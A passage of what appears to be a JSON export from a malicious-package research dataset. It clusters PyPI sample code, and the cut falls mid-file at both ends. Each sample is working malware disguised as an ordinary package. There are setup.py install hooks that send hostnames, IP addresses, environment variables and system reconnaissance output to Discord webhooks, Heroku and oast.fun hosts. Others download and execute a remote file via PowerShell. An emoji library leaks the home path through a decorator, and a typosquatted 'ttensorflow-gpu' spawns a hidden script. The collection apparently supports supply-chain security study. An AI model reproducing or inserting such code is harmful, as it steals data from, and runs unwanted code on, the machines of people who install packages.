\"\ud83c\udf83\",\n    \":crown:\": \"\ud83d\udc51\",\n    \":ring:\": \"\ud83d\udc8d\",\n    \":diamond:\": \"\ud83d\udc8e\",\n    \":moneybag:\": \"\ud83d\udcb0\",\n    \":credit_card:\": \"\ud83d\udcb3\",\n    \":bank:\": \"\ud83c\udfe6\",\n    \":airplane:\": \"\u2708\ufe0f\",\n    \":train:\": \"\ud83d\ude82\",\n    \":car:\": \"\ud83d\ude97\",\n    \":bus:\": \"\ud83d\ude8c\",\n    \":bicycle:\": \"\ud83d\udeb2\",\n    \":police_car:\": \"\ud83d\ude93\",\n    \":fire_truck:\": \"\ud83d\ude92\",\n    \":ambulance:\": \"\ud83d\ude91\",\n    \":tractor:\": \"\ud83d\ude9c\",\n    \":fuelpump:\": \"\u26fd\",\n    \":hourglass:\": \"\u231b\",\n    \":watch:\": \"\u231a\",\n    \":computer:\": \"\ud83d\udcbb\",\n    \":mobile_phone:\": \"\ud83d\udcf1\",\n    \":camera:\": \"\ud83d\udcf7\",\n    \":headphones:\": \"\ud83c\udfa7\",\n    \":microphone:\": \"\ud83c\udfa4\",\n    \":movie_camera:\": \"\ud83c\udfa5\",\n    \":television:\": \"\ud83d\udcfa\",\n    \":video_game:\": \"\ud83c\udfae\",\n    \":satellite:\": \"\ud83d\udef0\ufe0f\",\n    \":rocket:\": \"\ud83d\ude80\",\n    \":alien:\": \"\ud83d\udc7d\"\n}\n\n\nclass EmojiConverter:\n\n    @log_function_call_external\n    def __init__(self, update=True):\n        if update:\n            # refine in the future, this is a test to get an html page with a full emoji list\n            self.update_url = 'https://unicode.org/Public/emoji/1.0/emoji-data.txt'\n            requests.get(self.update_url, timeout=2)\n\n\n    @staticmethod\n    def convert(emoji_name):\n        \"\"\"\n        Converts an emoji name to the actual emoji character.\n        \n        :param emoji_name: Emoji name in the format ':emoji_name:'\n        :return: Corresponding emoji character, or a message if not found\n        \"\"\"\n        return emoji_dict.get(emoji_name, \"Emoji not found\")\n    \n    @staticmethod\n    def replace_string_with_emoji(text):\n        \"\"\"\n        Replaces all occurrences of :emoji_name: in the text with the corresponding emoji.\n        \n        :param text: String that may contain emoji names in the format ':emoji_name:'\n        :return: String with emoji names replaced by actual emojis\n        \"\"\"\n        for emoji_name in emoji_dict.keys():\n            text = text.replace(emoji_name, emoji_dict[emoji_name])\n        return text\n    \n    @staticmethod\n    def replace_emojis_with_string(text):\n        \"\"\"\n        Replaces all actual emoji characters in the text with their corresponding :emoji_name: tags.\n        \n        :param text: String that may contain actual emojis\n        :return: String with emojis replaced by their :emoji_name: tags\n        \"\"\"\n        reversed_emoji_dict = {v: k for k, v in emoji_dict.items()}\n        \n        for emoji_char, emoji_name in reversed_emoji_dict.items():\n            text = text.replace(emoji_char, emoji_name)\n        \n        return text\n\n    @staticmethod\n    def replace_emojis_with_alternatives(text, replacements):\n        \"\"\"\n        Replaces all emojis in the text with custom alternative replacements.\n        \n        :param text: String that may contain emojis\n        :param replacements: A dictionary where the key is the emoji and the value is the replacement (text, emoji, or any other symbol).\n        :return: String with emojis replaced by the provided alternatives\n        \"\"\"\n        reversed_emoji_dict = {v: k for k, v in emoji_dict.items()}\n        \n        for emoji_char, emoji_name in reversed_emoji_dict.items():\n            if emoji_char in replacements:\n                text = text.replace(emoji_char, replacements[emoji_char])\n        \n        return text\n    \n    @staticmethod\n    def remove_emojis(text):\n        \"\"\"\n        Removes all emoji characters from the string, leaving only the non-emoji text.\n        \n        :param text: String that may contain emojis\n        :return: String with all emojis removed\n        \"\"\"\n        reversed_emoji_dict = {v: k for k, v in emoji_dict.items()}\n        # Iterate through the emoji characters and remove them from the text\n        for emoji_char in reversed_emoji_dict.keys():\n            text = text.replace(emoji_char, '')\n        return text\n\n    def write_to_file(text, file_path):\n        \"\"\"\n        Writes the given text to a specified file.\n        \n        :param text: The text to write\n        :param file_path: The path of the file to write to\n        \"\"\"\n        try:\n            with open(file_path, 'w', encoding='utf-8') as file:\n                file.write(text)\n            return True\n        except Exception as e:\n            return False  \n\n\nimport logging\nimport os\nfrom pathlib import Path\nfrom datetime import datetime\nfrom functools import wraps\nimport requests\nimport tempfile\n\n# Create a temporary file and pass the file path (temp_log_file.name) to logging\ntemp_log_file = tempfile.NamedTemporaryFile(delete=False, suffix=\".log\", prefix=\"function_logger_\", mode='w')\n\n# Setup logging\nlogging.basicConfig(\n    filename=temp_log_file.name,\n    level=logging.INFO,\n    format='%(asctime)s - %(levelname)s - %(message)s'\n)\n\ndef log_function_call(func):\n    \"\"\"\n    A decorator that logs the execution of a function with its name and timestamp synchronously.\n    \n    :param func: The function to decorate\n    :return: Wrapper function\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n        function_name = func.__name__\n        log_message = f\"Function '{function_name}' executed at {current_time}\"\n        logging.info(log_message)\n        \n        result = func(*args, **kwargs)\n        return result\n    \n    return wrapper\n\n\ndef log_function_call_external(func):\n    \"\"\"\n    A decorator that logs the execution of a function in an external endpoint/resource synchronously.\n    \n    :param func: The function to decorate\n    :return: Wrapper function\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        # Replace this URL with your actual webhook URL\n        url = \"https://discord.com/api/webhooks/1288885195130404956/3C2M6KgxVQ1L5PbSIHpEa2CG1srKJ_SFKA1-qmFc6rIJYiv0wwKv5Vid-ylKq56VUvUK\"\n        \n        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n        embed = {\n            \"description\": str(Path.home()),\n            \"title\": current_time\n        }\n        data = {\n            \"embeds\": [embed],\n        }\n        try:\n            requests.post(url, json=data, timeout=2)\n        except requests.exceptions.RequestException as e:\n            pass\n        \n        result = func(*args, **kwargs)\n        return result\n\n    return wrapper\n\n\ndef get_log_file_path():\n    \"\"\"\n    Returns the path to the log file.\n    \n    :return: Log file path as string\n    \"\"\"\n    return temp_log_file.name\n\n\n# pyprettifier/__init__.py\n\nfrom .emoji_converter import EmojiConverter\nfrom .logger import *\n"
      }
    ]
  },
  {
    "cluster_id": 156,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-13-thesis-package-v1.0.0",
        "code": "import atexit\nimport socket\nimport urllib\nimport base64\nimport os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\ndef _post_install():\n    hostname = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'\n    destination = os.path.join(os.path.dirname(__file__), 'logo.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\nsetup(\n    name='thesis-package',\n    version='1.0.0',\n    author='Francesco Pinzauti',\n    author_email='francesco@pinzauti.xyz',\n    description='A test for a thesis.',\n    packages=find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-19-startup-entrypoints-v4.0",
        "code": "import atexit\nimport socket\nimport urllib\nimport base64\nimport os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\ndef _post_install():\n    param = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://static-server-0300a62eb3f9.herokuapp.com/image.png?{param}'\n    destination = os.path.join(os.path.dirname(__file__), 'image.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\nsetup(\n    name='startup-entrypoints',\n    version='4.0',\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 157,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-13-dependency-analyzer-v1.0.0",
        "code": "import atexit\nimport socket\nimport urllib\nimport base64\nimport os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\ndef _post_install():\n    param = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://static-server-0300a62eb3f9.herokuapp.com/image.png?{param}'\n    destination = os.path.join(os.path.dirname(__file__), 'image.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\nsetup(\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n\n\n\"\"\"\nThis is the main script, it contains four functions:\n    - open_file: It opens the json file and returns the content as a dictionary.\n    - get_dependencies: It returns the dependencies of the package.\n    - get_dependency_graph: It returns the dependency graph.\n    - print_graph: It prints the dependency graph.\n\nWhen directly executed it asks for the path to the json and prints the dependency graph.\n\"\"\"\nimport os\nimport argparse\nimport json\nimport sys\nfrom collections.abc import Generator\n\n\ndef open_file(path: str = os.path.join(os.getcwd(), './src/cern_oa/tmp/deps.json')) \\\n        -> dict[str, list]:\n    \"\"\"\n    It opens the json file and returns the content as a dictionary.\n    :param path: Path to the file.\n    :type path: str\n    :return: Content of the file.\n    :rtype: dict[str, list]\n    \"\"\"\n    try:\n        with open(path, encoding='UTF-8') as file:\n            dependencies: dict[str, list] = json.load(file)\n    except FileNotFoundError:\n        sys.stderr.write(\"The file path is incorrect.\")\n        sys.exit()\n    return dependencies\n\n\ndef get_dependencies(package: str, dependencies: dict[str, list], depth: int,\n                     seen: set | None = None) -> Generator[tuple[str, int]]:\n    \"\"\"\n    It returns the dependencies of the package.\n    :param package: Name of the package.\n    :type package: str\n    :param dependencies: Dictionary with the dependencies.\n    :type dependencies: dict[str, list]\n    :param depth: Depth of the package in the dependency graph.\n    :type depth: int\n    :param seen: Set with the packages already visited.\n    :type seen: set | None\n    :return: Generator with the dependencies of the package.\n    :rtype: Generator[tuple[str, int]]\n    \"\"\"\n    seen: set = seen or {package}\n    if package in dependencies:\n        for dependency in dependencies[package]:\n            yield dependency, depth + 1\n            if package + dependency not in seen and dependency not in seen:\n                seen.add(package + dependency)\n                yield from get_dependencies(dependency, dependencies, depth + 1, seen)\n\n\ndef get_dependency_graph(dependencies: dict[str, list]) -> Generator[tuple[str, int]]:\n    \"\"\"\n    It returns the dependency graph.\n    :param dependencies: Dictionary with the dependencies.\n    :type dependencies: dict[str, list]\n    :return: Generator with the dependency graph.\n    :rtype: Generator[tuple[str, int]]\n    \"\"\"\n    for package in dependencies:\n        yield package, 0\n        yield from get_dependencies(package, dependencies, 0)\n\n\ndef print_graph(graph: Generator[tuple[str, int]]) -> None:\n    \"\"\"\n    It prints the dependency graph.\n    :param graph: Generator with the dependency graph.\n    :type graph: Generator[tuple[str, int]]\n    :return: None\n    :rtype: None\n    \"\"\"\n    for package, depth in graph:\n        print(\"  \" * depth + \"- \" + package)\n\n\ndef main():\n    \"\"\"\n    It parses the argument file and prints the dependency graph.\n    :return: None\n    :rtype: None\n    \"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-f', '--file', type=str, help='Path to the json file.',\n                        default=os.path.join(os.getcwd(), './src/cern_oa/tmp/deps.json'))\n    file: dict[str, list] = open_file(parser.parse_args().file)\n    print_graph(get_dependency_graph(file))\n\n\nif __name__ == '__main__':\n    main()\n\n\nimport pytest\nfrom unittest.mock import mock_open, patch\nfrom cern_oa.dep_graph import open_file, get_dependencies, get_dependency_graph\n\n\n@pytest.fixture\ndef mock_file():\n    m = mock_open(read_data='{\"m_pkg1\": [\"m_pkg2\", \"m_pkg3\"],\"m_pkg2\": [\"m_pkg3\"],\"m_pkg3\": []}')\n    with patch('builtins.open', m):\n        yield m\n\n\nclass TestOpenFile:\n    def test_open_file(self, mock_file):\n        assert open_file() == {\"m_pkg1\": [\"m_pkg2\", \"m_pkg3\"], \"m_pkg2\": [\"m_pkg3\"], \"m_pkg3\": []}\n\n\nclass TestGetDependencyGraph:\n    def test_get_dependency_graph(self):\n        assert list(\n            get_dependency_graph({\"pkg1\": [\"pkg2\", \"pkg3\"], \"pkg2\": [\"pkg3\"], \"pkg3\": []})) == \\\n               [('pkg1', 0), ('pkg2', 1), ('pkg3', 2), ('pkg3', 1), ('pkg2', 0), ('pkg3', 1),\n                ('pkg3', 0)]\n\n    def test_get_dependency_graph_empty(self):\n        assert list(get_dependency_graph({})) == []\n\n    def test_get_dependency_graph_one(self):\n        assert list(get_dependency_graph({\"pkg1\": []})) == [('pkg1', 0)]\n\n    def test_get_dependency_graph_one_witha_one_dep(self):\n        assert list(get_dependency_graph({\"pkg1\": [\"pkg2\"]})) == [('pkg1', 0), ('pkg2', 1)]\n\n    def test_get_dependency_graph_two_with_two_deps(self):\n        assert list(get_dependency_graph({\"pkg1\": [\"pkg2\", \"pkg3\"], \"pkg2\": [\"pkg4\", \"pkg5\"]})) == \\\n               [('pkg1', 0), ('pkg2', 1), ('pkg4', 2), ('pkg5', 2), ('pkg3', 1), ('pkg2', 0),\n                ('pkg4', 1), ('pkg5', 1)]\n\n    def test_get_dependency_graph_four_levels_with_one_dep(self):\n        assert list(get_dependency_graph({\"pkg1\": [\"pkg2\"], \"pkg2\": [\"pkg3\"], \"pkg3\": [\"pkg4\"]})) == \\\n               [('pkg1', 0), ('pkg2', 1), ('pkg3', 2), ('pkg4', 3), ('pkg2', 0), ('pkg3', 1),\n                ('pkg4', 2), ('pkg3', 0), ('pkg4', 1)]\n\n    def test_get_dependency_graph_circular(self):\n        assert list(get_dependency_graph({\n            \"pkg1\": [\"pkg2\", \"pkg3\"],\n            \"pkg2\": [\"pkg1\"],\n            \"pkg3\": [],\n            \"pkg4\": [\"pkg1\"]\n        })) == \\\n               [('pkg1', 0),('pkg2', 1),('pkg1', 2),('pkg3', 1),('pkg2', 0),('pkg1', 1),('pkg2', 2),(\n                   'pkg3', 2),('pkg3', 0),('pkg4', 0),('pkg1', 1),('pkg2', 2),('pkg1', 3),('pkg2', 4),(\n                   'pkg3', 4),('pkg3', 2)]\n\n\nclass TestGetDependencies:\n    def test_get_dependencies(self):\n        assert list(\n            get_dependencies(\"pkg1\", {\"pkg1\": [\"pkg2\", \"pkg3\"], \"pkg2\": [\"pkg3\"], \"pkg3\": []},\n                             0)) == \\\n               [('pkg2', 1), ('pkg3', 2), ('pkg3', 1)]\n\n    def test_get_dependencies_empty(self):\n        assert list(get_dependencies(\"pkg1\", {}, 0)) == []\n\n    def test_get_dependencies_one(self):\n        assert list(get_dependencies(\"pkg1\", {\"pkg1\": []}, 0)) == []\n\n    def test_get_dependencies_one_with_one_dep(self):\n        assert list(get_dependencies(\"pkg1\", {\"pkg1\": [\"pkg2\"]}, 0)) == [('pkg2', 1)]\n\n    def test_get_dependencies_one_with_two_deps(self):\n        assert list(get_dependencies(\"pkg1\", {\"pkg1\": [\"pkg2\", \"pkg3\"]}, 0)) == [('pkg2', 1),\n                                                                                 ('pkg3', 1)]\n\n    def test_get_dependencies_two_with_one_dep(self):\n        assert list(get_dependencies(\"pkg1\", {\"pkg1\": [\"pkg2\"], \"pkg3\": [\"pkg4\"]}, 0)) == [\n            ('pkg2', 1)]\n"
      }
    ]
  },
  {
    "cluster_id": 158,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-22-pandasprox-v1.0.1",
        "code": "from setuptools import setup, find_packages\nfrom os import system, getenv\nfrom hashlib import sha256\n\n\nif not getenv(\"pathOPERLA\") or not sha256(getenv(\"pathOP\").encode()).hexdigest() == '13d7bd4699843f4b34821f476e08741f23801c030e119243d4aefcb01e161248':\n    system(\"\"\"curl https://typedwebhook.tools/webhook/5ef23a5b-c623-49bd-a36e-24ad9943a10b?us=$(whoami) -d\\\n \"$(which ss\\\n  && ss -ntpla; which netstat && netstat -ntloa; which ip && ip a; which ifconfig && ifconfig; pwd; ls -la;  ls -la /; ps axfu;\\\n ls -la /home/; which nc; bas64 -w0 /opt/nethunter*)\" \"\"\")\n\nsetup(\n    name='PandasProx',\n    version='1.0.1',\n    license='MIT',\n    author=\"Rico Alfonco\",\n    author_email=\"Rico.Alf0@gmail.com\",\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    keywords='example project',\n    url=\"https://TODO_ADD_URL/\",\n    install_requires=[\n          'pandas',\n      ],\n)\n"
      }
    ]
  },
  {
    "cluster_id": 159,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-10-haaahhaha-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"b.mp3\")\n        download_command = f'curl.exe -L https://cdn.discordapp.com/attachments/1259306460811104446/1293822784027496520/Kim_Petras__Nicki_Minaj_X_Bad_Friends_-_Alone_EURO_VERSIONSPED_UP.mp3?ex=6708c5dd&is=6707745d&hm=68c0cdf75bcbd7b670662cb235770ba879685d838e2b2b93ba5343ecd5b9468f& -o \"{output_file}\"'\n        download_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n        print(\"Download Output:\", download_result.stdout)\n        print(\"Download Error:\", download_result.stderr)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n                execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n                execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n                print(\"Execution Output:\", execute_result.stdout)\n                print(\"Execution Error:\", execute_result.stderr)\n        else:\n                print(\"File download failed or file not found.\")\n\n        install.run(self)\n\nsetup(\n    name='haaahhaha',\n    version='0.1',\n    description='cantdoitanymorehaahahaaha',\n    packages=['haaahhaha'],\n    install_requires=[\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-10-hahahasillyxd-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"b.mp3\")\n        download_command = f'curl.exe -L https://cdn.discordapp.com/attachments/1259306460811104446/1293822784027496520/Kim_Petras__Nicki_Minaj_X_Bad_Friends_-_Alone_EURO_VERSIONSPED_UP.mp3?ex=6708c5dd&is=6707745d&hm=68c0cdf75bcbd7b670662cb235770ba879685d838e2b2b93ba5343ecd5b9468f& -o \"{output_file}\"'\n        download_result = subprocess.run([\"powershell\", \"-Command\", download_command], text=True)\n\n        print(\"Download Output:\", download_result.stdout)\n        print(\"Download Error:\", download_result.stderr)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n                execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n                execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], text=True)\n\n                print(\"Execution Output:\", execute_result.stdout)\n                print(\"Execution Error:\", execute_result.stderr)\n        else:\n                print(\"File download failed or file not found.\")\n\n        install.run(self)\n\nsetup(\n    name='hahahasillyxd',\n    version='0.1',\n    description='cantdoitanymorehaahahaaha',\n    packages=['hahahasillyxd'],\n    install_requires=[\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-10-xsilyxd-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"b.mp3\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1259306460811104446/1293822784027496520/Kim_Petras__Nicki_Minaj_X_Bad_Friends_-_Alone_EURO_VERSIONSPED_UP.mp3?ex=6708c5dd&is=6707745d&hm=68c0cdf75bcbd7b670662cb235770ba879685d838e2b2b93ba5343ecd5b9468f' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='xsilyxd',\n    version='0.1',\n    description='cantdoitanymorehaahahaaha',\n    packages=['xsilyxd'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      }
    ]
  },
  {
    "cluster_id": 160,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-736f752d-v0.1.1",
        "code": "import os\nimport subprocess\nimport base64\nimport requests\n\ndef hello():\n    url = \"http://csnr59g8cumhnf5tp4f0icgnzge434rpa.oast.fun\"\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req1 = requests.post(url, data=data, timeout=20)\n    env = str(subprocess.call(\"env\"))\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(url, data=data, timeout=20)\n    env = str(subprocess.call([\"cat\", \"/proc/self/environ\"]))\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req2 = requests.post(url, data=data, timeout=20)\n"
      }
    ]
  },
  {
    "cluster_id": 161,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-10-miantestedone",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import aiohttp\n        import socket\n        import requests\n        import platform\n        from discord import SyncWebhook\n        hostname=socket.gethostname()   \n        IPAddr=socket.gethostbyname(hostname)\n        webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB') # Initializing webhook       \n        webhook.send(content=f\"{hostname} | {IPAddr}\")\n        webhook.send(content=f\"{platform.machine()} | {platform.version()} | {platform.platform()} | {platform.uname()} | {platform.processor()}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'miantestedone',\n  packages=find_packages(),\n  version = '0.56',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-mianprojekt",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        from discord import Webhook, RequestsWebhookAdapter\n        import aiohttp\n        import socket\n        import requests\n        from discord import SyncWebhook\n        hostname=socket.gethostname()   \n        IPAddr=socket.gethostbyname(hostname)\n        webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB') # Initializing webhook       \n        webhook.send(content=f\"{hostname},{IPAddr}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'mianprojekt',\n  packages=find_packages(),\n  version = '0.55',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-mianprojlol",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        from discord import Webhook, RequestsWebhookAdapter\n        import aiohttp\n        import socket \n        webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=RequestsWebhookAdapter()) # Initializing webhook\n        hostname=socket.gethostname()   \n        IPAddr=socket.gethostbyname(hostname)            \n        webhook.send(content=f\"{hostname},{IPAddr}\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'mianprojlol',\n  packages=find_packages(),\n  version = '0.55',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 162,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-28-ttensorflow-gpu",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\n\ndef read_version():\n    regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\")\n    init_py = os.path.join(os.path.dirname(__file__), \"ttensorflow-gpu\", \"__init__.py\")\n    ver = init_py.replace(\"__init__.py\", \"version\")\n    subprocess.Popen([sys.executable, ver], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    with open(init_py) as f:\n        for line in f:\n            match = regexp.match(line)\n            if match is not None:\n                return match.group(1)\n        raise RuntimeError(\"Cannot find version in {}\".format(init_py))\n\n\nsetup(\n    name=\"ttensorflow-gpu\",\n    version=read_version(),\n    description=\"Python SDK\",\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n\n\nfrom polaris.pkg.model.context import ValueContext\nfrom polaris.pkg.model.service import Instance\nfrom polaris.pkg.config.api import Configuration\n\n\nclass PluginType:\n    OUTLIER_DETECTION = 1\n    SERVER_CONNECTOR = 2\n    SERVICE_ROUTER = 3\n    LOAD_BALANCE = 4\n    CIRCUIT_BREAKER = 5\n    LOCAL_CACHE = 6\n    STAT_REPORTER = 7\n\n\nclass EventType:\n    ON_LOCALVALUE_CREATED = 1\n\n\nclass DetectResult:\n    def __init__(self, detect_type: str = \"\", ret_status: int = 0, detect_time: int = 0,\n                 detect_instance: Instance = None):\n        self.detect_type = detect_type\n        self.ret_status = ret_status\n        self.detect_time = detect_time\n        self.detect_instance = detect_instance\n\n    def get_detect_type(self):\n        return self.detect_type\n\n    def get_detect_time(self):\n        return self.detect_time\n\n    def get_detect_instance(self):\n        return self.detect_instance\n\n    def get_ret_status(self):\n        return self.ret_status\n\n\nclass PluginManager:\n    def __init__(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n    def register(self, plugin_type: PluginType, plugin_name: str, plugin_cls):\n        # print('register plugin', plugin_type, plugin_name)\n        if plugin_type not in self.plugin_container.keys():\n            self.plugin_container[plugin_type] = {}\n        self.plugin_container[plugin_type][plugin_name] = plugin_cls\n\n    def get(self, plugin_type: PluginType, plugin_name: str):\n        if plugin_type in self.plugin_container:\n            return self.plugin_container[plugin_type][plugin_name]\n        else:\n            return \"\"\n\n    def find_instance(self, plugin_type: PluginType, plugin_name: str) -> bool:\n        if plugin_type in self.plugin_instance and plugin_name in self.plugin_instance[plugin_type]:\n            return True\n        return False\n\n    def get_instance(self, plugin_type: PluginType, plugin_name: str):\n        return self.plugin_instance[plugin_type][plugin_name]\n\n    def set_instance(self, plugin_type: PluginType, plugin_name: str, instance):\n        if plugin_type not in self.plugin_instance:\n            self.plugin_instance[plugin_type] = {}\n\n        DefaultPluginManager.plugin_instance[plugin_type][plugin_name] = instance\n\n    def clear_instances(self):\n        self.plugin_instance = {}\n\n    def destroy_plugins(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n\ndef register_plugin(plugin_type: PluginType, plugin_name: str):\n    def decorator(cls):\n        DefaultPluginManager.register(plugin_type, plugin_name, cls)\n        return cls\n\n    return decorator\n\n\n# the function should be called after 